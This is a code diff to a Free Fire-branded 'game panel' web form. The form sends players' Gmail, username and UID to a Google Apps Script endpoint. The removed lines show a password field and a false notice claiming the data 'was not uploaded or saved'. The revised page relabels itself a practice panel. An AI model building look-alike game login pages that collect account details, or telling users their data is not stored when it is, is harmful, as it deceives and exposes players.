@@ -92,6 +92,11 @@ body {
     text-transform: uppercase;
 }
 
+.login-btn:disabled {
+    opacity: 0.6;
+    cursor: wait;
+}
+
 .message {
     display: none;
     margin-top: 20px;
@@ -128,27 +133,36 @@ body {
 
         <div class="input-group">
             <label>Gmail</label>
-            <input type="text" id="gmail"
-                   placeholder="Enter your Gmail"
-                   autocomplete="off" required>
+            <input
+                type="email"
+                id="gmail"
+                placeholder="Enter your Gmail"
+                autocomplete="off"
+                required>
         </div>
 
         <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password"
-                   placeholder="Enter password"
-                   autocomplete="off" required>
+            <label>Username</label>
+            <input
+                type="text"
+                id="username"
+                placeholder="Enter your username"
+                autocomplete="off"
+                required>
         </div>
 
         <div class="input-group">
             <label>Free Fire UID</label>
-            <input type="text" id="uid"
-                   placeholder="Enter your UID"
-                   inputmode="numeric" required>
+            <input
+                type="text"
+                id="uid"
+                placeholder="Enter your UID"
+                inputmode="numeric"
+                required>
         </div>
 
         <button class="login-btn" type="submit">
-            LOGIN
+            SUBMIT
         </button>
 
     </form>
@@ -156,24 +170,30 @@ body {
     <div class="message" id="message">
         <div class="check">✓</div>
         <strong>Verification Complete</strong>
-        <p>Your information was not uploaded or saved.</p>
+        <p>Your practice information was received.</p>
     </div>
 
     <div class="watermark">
-        FREE FIRE • GAME PANEL
+        FREE FIRE • PRACTICE PANEL
     </div>
 
 </div>
 
 <script>
 const GOOGLE_SCRIPT_URL =
-    "https://script.google.com/macros/s/AKfycbyyGPMsg-pi5JLsWC7Ms0V5CNlW9I4IFI6laUIAWVkb02yoKTgXGFvzX8oZp-8WW2U/exec";
+"https://script.google.com/macros/s/AKfycbyyGPMsg-pi5JLsWC7Ms0V5CNlW9I4IFI6laUIAWVkb02yoKTgXGFvzX8oZp-8WW2U/exec";
 
 document.getElementById("gameForm").addEventListener("submit", async function(event) {
     event.preventDefault();
 
-    const email = document.getElementById("gmail").value;
-    const uid = document.getElementById("uid").value;
+    const email = document.getElementById("gmail").value.trim();
+    const username = document.getElementById("username").value.trim();
+    const uid = document.getElementById("uid").value.trim();
+
+    const button = this.querySelector(".login-btn");
+
+    button.disabled = true;
+    button.textContent = "SENDING...";
 
     try {
         await fetch(GOOGLE_SCRIPT_URL, {
@@ -184,16 +204,21 @@ document.getElementById("gameForm").addEventListener("submit", async function(ev
             },
             body: JSON.stringify({
                 email: email,
+                username: username,
                 uid: uid
             })
         });
 
         document.getElementById("message").style.display = "block";
-        this.querySelector(".login-btn").textContent = "SUBMITTED ✓";
+        button.textContent = "SUBMITTED ✓";
 
     } catch (error) {
         console.error(error);
-        alert("Could not submit the form.");
+
+        button.disabled = false;
+        button.textContent = "SUBMIT";
+
+        alert("Could not submit the information.");
     }
 });
 </script>
